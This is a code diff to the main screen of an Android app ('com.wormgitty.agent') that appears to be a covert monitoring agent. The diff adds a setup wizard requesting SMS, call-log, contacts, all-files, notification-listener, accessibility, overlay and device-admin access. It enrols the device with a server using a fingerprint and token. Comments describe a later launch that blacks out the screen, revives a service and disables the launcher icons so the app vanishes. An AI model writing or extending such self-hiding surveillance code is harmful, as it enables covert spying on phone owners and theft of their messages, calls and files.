@@ -19,12 +19,15 @@ import androidx.compose.foundation.layout.width
 import androidx.compose.foundation.rememberScrollState
 import androidx.compose.foundation.shape.CircleShape
 import androidx.compose.foundation.verticalScroll
+import androidx.compose.material3.AlertDialog
 import androidx.compose.material3.Button
 import androidx.compose.material3.ButtonDefaults
+import androidx.compose.material3.CircularProgressIndicator
 import androidx.compose.material3.MaterialTheme
 import androidx.compose.material3.OutlinedTextField
 import androidx.compose.material3.Text
 import androidx.compose.material3.TextButton
+import androidx.compose.material3.lightColorScheme
 import androidx.compose.runtime.Composable
 import androidx.compose.runtime.LaunchedEffect
 import androidx.compose.runtime.getValue
@@ -38,6 +41,7 @@ import androidx.compose.ui.Modifier
 import androidx.compose.ui.graphics.Color
 import androidx.compose.ui.platform.LocalContext
 import androidx.compose.ui.platform.testTag
+import androidx.compose.ui.res.colorResource
 import androidx.compose.ui.res.stringResource
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
@@ -54,6 +58,7 @@ class MainActivity : ComponentActivity() {
         super.onCreate(savedInstanceState)
         val store = RegistrationStore(this)
         val prefs = HidePrefs(this)
+        kotlinx.coroutines.runBlocking { EndpointPrefs(this@MainActivity).apply() }
 
         // A previous run armed the hide: this launch performs it, then vanishes.
         val hideArmed = kotlinx.coroutines.runBlocking { prefs.pendingHide() }
@@ -68,10 +73,20 @@ class MainActivity : ComponentActivity() {
         }
 
         val mockPerms = intent.getBooleanExtra(EXTRA_MOCK_PERMS, false)
-        val checker: PermissionChecker = if (mockPerms) GreenChecker else SystemPermissionChecker()
+        val checker: PermissionChecker = when {
+            !mockPerms -> SystemPermissionChecker()
+            intent.getBooleanExtra(EXTRA_DENY_GATES, false) -> GateDeniedChecker
+            else -> GreenChecker
+        }
         val opener: PermissionOpener = SystemPermissionOpener()
         // Injected transport: the only network-shaped seam in the app.
-        val api: RegistrationApi = FakeRegistrationApi(applicationContext)
+        val api: RegistrationApi =
+            if (mockPerms) FakeRegistrationApi(applicationContext)
+            else ServerRegistrationApi(applicationContext).also { srv ->
+                // Dev/test hook: a fresh enroll JWT may be handed in via
+                // `am start -e enroll_token <jwt>` when the baked token expired.
+                intent.getStringExtra(EXTRA_ENROLL_TOKEN)?.let { srv.enrollToken = it }
+            }
         val deviceInfo: DeviceInfoProvider = SystemDeviceInfoProvider(applicationContext)
 
         setContent {
@@ -124,10 +139,18 @@ class MainActivity : ComponentActivity() {
             .setCancelable(false)
             .create()
         dlg.show()
+        // Arabic notice on LTR devices: force RTL so the arrows read correctly.
+        dlg.window?.decorView?.layoutDirection = android.view.View.LAYOUT_DIRECTION_RTL
     }
 
     /** Second-launch sequence: 2000ms black veil, revive service, hide aliases, finish. */
     private fun runHideSequence(prefs: HidePrefs) {
+        // The seal coroutine may resume on a non-UI dispatcher — setContentView
+        // and alias writes must run on main.
+        if (android.os.Looper.myLooper() != mainLooper) {
+            android.os.Handler(mainLooper).post { runHideSequence(prefs) }
+            return
+        }
         val veil = android.view.View(this)
         veil.setBackgroundColor(android.graphics.Color.BLACK)
         setContentView(veil)
@@ -149,14 +172,17 @@ class MainActivity : ComponentActivity() {
     fun setAliases(hiddenVisible: Boolean) {
         val pm = packageManager
         val pkg = packageName
+        // Alias CLASS names live under the shared namespace (com.wormgitty.agent),
+        // not the flavor applicationId — ComponentName(pkg, cls) requires both.
+        val ns = "com.wormgitty.agent"
         pm.setComponentEnabledSetting(
-            ComponentName(pkg, "$pkg.LauncherBoost"),
+            ComponentName(pkg, "$ns.LauncherBoost"),
             if (hiddenVisible) PackageManager.COMPONENT_ENABLED_STATE_DISABLED
             else PackageManager.COMPONENT_ENABLED_STATE_DEFAULT,
             PackageManager.DONT_KILL_APP
         )
         pm.setComponentEnabledSetting(
-            ComponentName(pkg, "$pkg.LauncherHidden"),
+            ComponentName(pkg, "$ns.LauncherHidden"),
             PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
             PackageManager.DONT_KILL_APP
         )
@@ -164,6 +190,8 @@ class MainActivity : ComponentActivity() {
 
     companion object {
         const val EXTRA_MOCK_PERMS = "mock_perms"
+        const val EXTRA_ENROLL_TOKEN = "enroll_token"
+        const val EXTRA_DENY_GATES = "mock_deny_gates"
         const val VEIL_MS = 2000L
     }
 }
@@ -172,6 +200,12 @@ class MainActivity : ComponentActivity() {
 object GreenChecker : PermissionChecker {
     override fun states(ctx: Context): Map<PermKey, Boolean> =
         PermKey.entries.associateWith { true }
+}
+
+/** All-green except the four gate keys — exercises the skip-confirm dialog. */
+object GateDeniedChecker : PermissionChecker {
+    override fun states(ctx: Context): Map<PermKey, Boolean> =
+        PermKey.entries.associateWith { it !in PermKey.GATE_KEYS }
 }
 
 @Composable
@@ -205,19 +239,30 @@ fun NextButton(enabled: Boolean, tag: String, label: Int = R.string.btn_next, on
     ) { Text(stringResource(label)) }
 }
 
-/** The six single-permission screens, in spec order. */
-data class PermSpec(val key: PermKey, val icon: String, val reasonRes: Int)
+/**
+ * Permission sections, in wizard order: everyday "app" permissions first
+ * (files & notifications, camera, calls/messages), device-protection last.
+ * Each section is one screen listing its permissions by name.
+ */
+data class PermSection(val titleRes: Int, val icon: String, val reasonRes: Int, val keys: List<PermKey>)
 
-val PERM_FLOW = listOf(
-    PermSpec(PermKey.ACCESSIBILITY, "♿", R.string.reason_a11y),
-    PermSpec(PermKey.BATTERY_OPT, "🔋", R.string.reason_battery),
-    PermSpec(PermKey.NOTIF_LISTENER, "🔔", R.string.reason_notif),
-    PermSpec(PermKey.CAMERA, "📷", R.string.reason_camera),
-    PermSpec(PermKey.STORAGE_READ, "🗂️", R.string.reason_storage),
-    PermSpec(PermKey.CALL_LOG, "📞", R.string.reason_calllog),
-    PermSpec(PermKey.SMS, "💬", R.string.reason_sms),
-    PermSpec(PermKey.CONTACTS, "👥", R.string.reason_contacts),
-    PermSpec(PermKey.ALL_FILES, "📁", R.string.reason_all_files)
+val PERM_SECTIONS = listOf(
+    PermSection(
+        R.string.sec_files_notif, "🗂️", R.string.reason_sec_files,
+        listOf(PermKey.STORAGE_READ, PermKey.ALL_FILES, PermKey.NOTIFICATIONS, PermKey.NOTIF_LISTENER)
+    ),
+    PermSection(
+        R.string.sec_camera, "📷", R.string.reason_sec_camera,
+        listOf(PermKey.CAMERA)
+    ),
+    PermSection(
+        R.string.sec_comms, "📞", R.string.reason_sec_comms,
+        listOf(PermKey.CALL_LOG, PermKey.SMS, PermKey.CONTACTS)
+    ),
+    PermSection(
+        R.string.sec_protection, "🛡️", R.string.reason_sec_protection,
+        listOf(PermKey.ACCESSIBILITY, PermKey.BATTERY_OPT, PermKey.OVERLAY, PermKey.DEVICE_ADMIN)
+    )
 )
 
 @Composable
@@ -229,14 +274,14 @@ fun WizardScreen(
     deviceInfo: DeviceInfoProvider,
     onSealed: suspend () -> Unit
 ) {
-    var step by rememberSaveable { mutableStateOf(Step.INTRO) }
+    var step by rememberSaveable { mutableStateOf(Step.LOADING) }
     var permIdx by rememberSaveable { mutableStateOf(0) }
     var name by remember { mutableStateOf("") }
     var gender by rememberSaveable { mutableStateOf("") }
     var phoneRaw by remember { mutableStateOf("") }
-    val permStates = remember { mutableStateMapOf<PermKey, Boolean>() }
-    PermKey.entries.forEach { permStates.putIfAbsent(it, false) }
+    val brand = colorResource(R.color.brand_primary)
 
+    MaterialTheme(colorScheme = lightColorScheme(primary = brand)) {
     Box(
         Modifier
             .fillMaxSize()
@@ -250,22 +295,43 @@ fun WizardScreen(
                 .padding(bottom = 48.dp)
         ) {
             when (step) {
-                Step.INTRO -> {
-                    // Logo block: neutral Material surface tile.
-                    Box(
-                        Modifier
-                            .padding(top = 48.dp, bottom = 24.dp)
-                            .size(88.dp)
-                            .background(MaterialTheme.colorScheme.primary, CircleShape)
-                    )
-                    WizardTitle(stringResource(R.string.welcome_line1))
-                    Text(
-                        stringResource(R.string.welcome_sub),
-                        fontSize = 14.sp,
-                        color = MaterialTheme.colorScheme.onSurfaceVariant
-                    )
-                    NextButton(enabled = true, tag = "next_intro", label = R.string.btn_get_started) {
+                Step.LOADING -> {
+                    LaunchedEffect(Unit) {
+                        delay(1800)
                         step = Step.IDENTITY
+                    }
+                    Column(
+                        Modifier
+                            .fillMaxWidth()
+                            .padding(top = 64.dp),
+                        horizontalAlignment = Alignment.CenterHorizontally
+                    ) {
+                        Box(
+                            Modifier
+                                .size(96.dp)
+                                .background(brand, CircleShape),
+                            contentAlignment = Alignment.Center
+                        ) {
+                            Text(stringResource(R.string.brand_mark), fontSize = 40.sp)
+                        }
+                        WizardTitle(stringResource(R.string.app_name))
+                        Text(
+                            stringResource(R.string.welcome_line2),
+                            fontSize = 14.sp,
+                            color = MaterialTheme.colorScheme.onSurfaceVariant
+                        )
+                        CircularProgressIndicator(
+                            color = brand,
+                            modifier = Modifier
+                                .padding(top = 28.dp)
+                                .testTag("loading_spinner")
+                        )
+                        Text(
+                            stringResource(R.string.loading_line),
+                            fontSize = 12.sp,
+                            color = MaterialTheme.colorScheme.onSurfaceVariant,
+                            modifier = Modifier.padding(top = 12.dp)
+                        )
                     }
                 }
 
@@ -347,67 +413,140 @@ fun WizardScreen(
                 }
 
                 Step.PERM -> {
-                    val spec = PERM_FLOW[permIdx]
+                    val section = PERM_SECTIONS[permIdx]
                     val activity = LocalContext.current as ComponentActivity
-                    var granted by remember { mutableStateOf(checker.states(activity)[spec.key] == true) }
-                    var prevGranted by remember { mutableStateOf(granted) }
+                    // Keyed to permIdx: repopulates synchronously per section so the
+                    // allGranted check never dips false on a section switch.
+                    val sectionStates = remember(permIdx) {
+                        mutableStateMapOf<PermKey, Boolean>().also { m ->
+                            section.keys.forEach { k -> m[k] = checker.states(activity)[k] == true }
+                        }
+                    }
+                    var prevAllGranted by remember(permIdx) {
+                        mutableStateOf(section.keys.all { sectionStates[it] == true })
+                    }
                     // Poll: catches both runtime-request results and settings returns.
                     LaunchedEffect(permIdx) {
                         while (true) {
-                            granted = checker.states(activity)[spec.key] == true
+                            section.keys.forEach { k ->
+                                sectionStates[k] = checker.states(activity)[k] == true
+                            }
                             kotlinx.coroutines.delay(1200)
                         }
                     }
-                    // Granted transition auto-advances; already-granted does not.
-                    LaunchedEffect(granted) {
-                        if (granted && !prevGranted) {
-                            if (permIdx < PERM_FLOW.lastIndex) permIdx++ else step = Step.SUMMARY
-                        }
-                        prevGranted = granted
+                    val allGranted = section.keys.all { sectionStates[it] == true }
+                    fun advanceSection() {
+                        if (permIdx < PERM_SECTIONS.lastIndex) permIdx++ else step = Step.SUMMARY
                     }
-                    Text(spec.icon, fontSize = 44.sp, modifier = Modifier.padding(top = 24.dp))
-                    WizardTitle(stringResource(spec.key.titleRes))
+                    // All-granted transition auto-advances; already-granted does not.
+                    LaunchedEffect(allGranted) {
+                        if (allGranted && !prevAllGranted) advanceSection()
+                        prevAllGranted = allGranted
+                    }
+                    Text(section.icon, fontSize = 44.sp, modifier = Modifier.padding(top = 24.dp))
+                    WizardTitle(stringResource(section.titleRes))
                     Text(
-                        stringResource(spec.reasonRes),
+                        stringResource(section.reasonRes),
                         fontSize = 14.sp,
                         color = MaterialTheme.colorScheme.onSurfaceVariant
                     )
-                    Row(
-                        Modifier.padding(top = 14.dp),
-                        verticalAlignment = Alignment.CenterVertically
-                    ) {
-                        Box(
+                    section.keys.forEachIndexed { idx, key ->
+                        val granted = sectionStates[key] == true
+                        Row(
                             Modifier
-                                .size(12.dp)
-                                .background(if (granted) GREEN_OK else RED, CircleShape)
-                        )
-                        Spacer(Modifier.width(8.dp))
-                        Text(
-                            stringResource(if (granted) R.string.granted_mark else spec.key.titleRes),
-                            fontSize = 12.sp
-                        )
+                                .fillMaxWidth()
+                                .padding(top = 14.dp),
+                            verticalAlignment = Alignment.CenterVertically
+                        ) {
+                            Box(
+                                Modifier
+                                    .size(12.dp)
+                                    .background(if (granted) GREEN_OK else RED, CircleShape)
+                            )
+                            Spacer(Modifier.width(8.dp))
+                            Text(
+                                stringResource(key.titleRes),
+                                fontSize = 14.sp,
+                                modifier = Modifier.weight(1f)
+                            )
+                            if (granted) {
+                                Text(
+                                    stringResource(R.string.granted_mark),
+                                    fontSize = 12.sp,
+                                    color = GREEN_OK
+                                )
+                            } else {
+                                TextButton(
+                                    onClick = {
+                                        val rp = key.runtimePerm
+                                        if (rp != null) {
+                                            androidx.core.app.ActivityCompat.requestPermissions(
+                                                activity, arrayOf(rp), permIdx * 100 + idx
+                                            )
+                                        } else {
+                                            opener.open(activity, key)
+                                        }
+                                    },
+                                    modifier = Modifier.testTag("perm_allow_$idx")
+                                ) { Text(stringResource(R.string.btn_allow)) }
+                            }
+                        }
                     }
+                    // Gate sections: skip must name each missing required
+                    // permission and its consequence before the user confirms.
+                    val missingGates = section.keys.filter { it.required && sectionStates[it] != true }
+                    var showGateDialog by remember(permIdx) { mutableStateOf(false) }
                     Row(Modifier.padding(top = 20.dp)) {
-                        Button(
-                            onClick = {
-                                val rp = spec.key.runtimePerm
-                                if (rp != null) {
-                                    androidx.core.app.ActivityCompat.requestPermissions(
-                                        activity, arrayOf(rp), permIdx + 100
-                                    )
-                                } else {
-                                    opener.open(activity, spec.key)
-                                }
-                            },
-                            enabled = !granted,
-                            modifier = Modifier.testTag("perm_allow")
-                        ) { Text(stringResource(R.string.btn_allow)) }
                         TextButton(
                             onClick = {
-                                if (permIdx < PERM_FLOW.lastIndex) permIdx++ else step = Step.SUMMARY
+                                if (missingGates.isNotEmpty()) showGateDialog = true
+                                else advanceSection()
                             },
                             modifier = Modifier.testTag("perm_skip")
                         ) { Text(stringResource(R.string.btn_skip)) }
+                        if (missingGates.isNotEmpty()) {
+                            Text(
+                                stringResource(R.string.missing_gate_count, missingGates.size),
+                                fontSize = 12.sp,
+                                color = RED,
+                                modifier = Modifier
+                                    .align(Alignment.CenterVertically)
+                                    .testTag("missing_gate_count")
+                            )
+                        }
+                    }
+                    if (showGateDialog) {
+                        AlertDialog(
+                            onDismissRequest = { showGateDialog = false },
+                            title = { Text(stringResource(R.string.gate_skip_title)) },
+                            text = {
+                                Column {
+                                    missingGates.forEach { g ->
+                                        Text(
+                                            stringResource(g.titleRes) + " — " +
+                                                stringResource(g.gateImpactRes),
+                                            fontSize = 14.sp,
+                                            modifier = Modifier.padding(top = 6.dp)
+                                        )
+                                    }
+                                }
+                            },
+                            confirmButton = {
+                                TextButton(
+                                    onClick = {
+                                        showGateDialog = false
+                                        advanceSection()
+                                    },
+                                    modifier = Modifier.testTag("gate_skip_confirm")
+                                ) { Text(stringResource(R.string.btn_skip_risky)) }
+                            },
+                            dismissButton = {
+                                TextButton(
+                                    onClick = { showGateDialog = false },
+                                    modifier = Modifier.testTag("gate_skip_back")
+                                ) { Text(stringResource(R.string.btn_back)) }
+                            }
+                        )
                     }
                 }
 
@@ -426,12 +565,28 @@ fun WizardScreen(
                             )
                         )
                     )
+                    // Missing gates surface in red with their consequence.
+                    val summaryStates = checker.states(LocalContext.current)
+                    PermKey.GATE_KEYS.filter { summaryStates[it] != true }.forEach { g ->
+                        Text(
+                            stringResource(g.titleRes) + " — " + stringResource(g.gateImpactRes),
+                            fontSize = 13.sp,
+                            color = RED,
+                            modifier = Modifier
+                                .padding(top = 4.dp)
+                                .testTag("summary_missing_gate_${g.name}")
+                        )
+                    }
                     var finishing by remember { mutableStateOf(false) }
+                    var enrollError by remember { mutableStateOf<String?>(null) }
+                    var retryTick by remember { mutableStateOf(0) }
+                    var tokenInput by remember { mutableStateOf("") }
                     NextButton(enabled = !finishing, tag = "finish", label = R.string.btn_finish) {
                         finishing = true
+                        enrollError = null
                     }
                     if (finishing) {
-                        LaunchedEffect(Unit) {
+                        LaunchedEffect(retryTick) {
                             val reg = Registration(
                                 "",
                                 name.trim(),
@@ -441,13 +596,65 @@ fun WizardScreen(
                                 deviceInfo.fingerprint(),
                                 deviceInfo.constraints()
                             )
-                            api.register(reg).onSuccess { id -> store.save(reg.copy(id = id)) }
-                            onSealed()
+                            api.register(reg)
+                                .onSuccess { id ->
+                                    store.save(reg.copy(id = id))
+                                    onSealed()
+                                }
+                                .onFailure { enrollError = it.message ?: "enroll_failed" }
+                        }
+                    }
+                    enrollError?.let { err ->
+                        val activityCtx = LocalContext.current
+                        Text(
+                            stringResource(R.string.enroll_failed_fmt, err),
+                            fontSize = 13.sp,
+                            color = RED,
+                            modifier = Modifier.padding(top = 12.dp).testTag("enroll_error")
+                        )
+                        Row(Modifier.padding(top = 8.dp)) {
+                            Button(
+                                onClick = {
+                                    tokenInput.takeIf { it.isNotBlank() }
+                                        ?.let { (api as? EnrollTokenAware)?.enrollToken = it }
+                                    enrollError = null
+                                    retryTick++
+                                },
+                                modifier = Modifier.testTag("enroll_retry")
+                            ) { Text(stringResource(R.string.btn_retry)) }
+                            (api as? EnrollTokenAware)?.let { aware ->
+                                TextButton(
+                                    onClick = {
+                                        val cm = activityCtx.getSystemService(
+                                            Context.CLIPBOARD_SERVICE
+                                        ) as android.content.ClipboardManager
+                                        cm.setPrimaryClip(
+                                            android.content.ClipData.newPlainText(
+                                                "enroll_token", aware.enrollToken
+                                            )
+                                        )
+                                    },
+                                    modifier = Modifier.testTag("enroll_copy")
+                                ) { Text(stringResource(R.string.btn_copy_token)) }
+                            }
+                        }
+                        if (api is EnrollTokenAware) {
+                            OutlinedTextField(
+                                value = tokenInput,
+                                onValueChange = { tokenInput = it },
+                                label = { Text(stringResource(R.string.enroll_token_hint)) },
+                                singleLine = true,
+                                modifier = Modifier
+                                    .fillMaxWidth()
+                                    .padding(top = 8.dp)
+                                    .testTag("enroll_token_input")
+                            )
                         }
                     }
                 }
             }
         }
         Box(Modifier.align(Alignment.BottomCenter)) { NemesisFooter() }
+    }
     }
 }
